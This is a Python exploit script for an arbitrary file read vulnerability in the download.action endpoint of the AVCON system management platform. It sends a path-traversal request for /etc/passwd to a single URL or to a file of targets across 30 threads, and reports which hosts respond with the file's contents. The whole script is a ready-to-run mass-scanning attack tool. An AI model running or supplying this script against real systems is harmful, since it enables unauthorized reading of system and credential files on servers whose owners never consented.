import requests
from multiprocessing.dummy import Pool
import argparse
requests.packages.urllib3.disable_warnings()

def main():
    parse = argparse.ArgumentParser(description="AVCON-系统管理平台download.action任意文件读取漏洞")
    parse.add_argument('-u', '--url', dest='url', type=str, help='Please input url')
    parse.add_argument('-f', '--file', dest='file', type=str, help='Please input file')
    args = parse.parse_args()
    try:
        if args.url:
            check(args.url)
        else:
            targets = []
            f = open(args.file, 'r+')
            for i in f.readlines():
                target = i.strip()
                if 'http' in i:
                    targets.append(target)
                else:
                    target = f"http://{i}"
                    targets.append(target)
            pool = Pool(30)
            pool.map(check, targets)
    except Exception as s:
        pass
def check(target):
    url = f'{target}/download.action?filename=../../../../../../../../etc/passwd'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:128.0) Gecko/20100101 Firefox/128.0',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8',
        'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
        'Accept-Encoding': 'gzip, deflate',
        'Connection': 'close'
    }
    response = requests.get(url=url, headers=headers, verify=False, timeout=10)
    try:
        if response.status_code == 200 and 'root' in response.text:
            print(f'存在漏洞 {url}')
        else:
             print(f'不存在漏洞  {url}')
    except Exception as e:
        print(f"[timeout] {url}")

if __name__ == '__main__':
    main()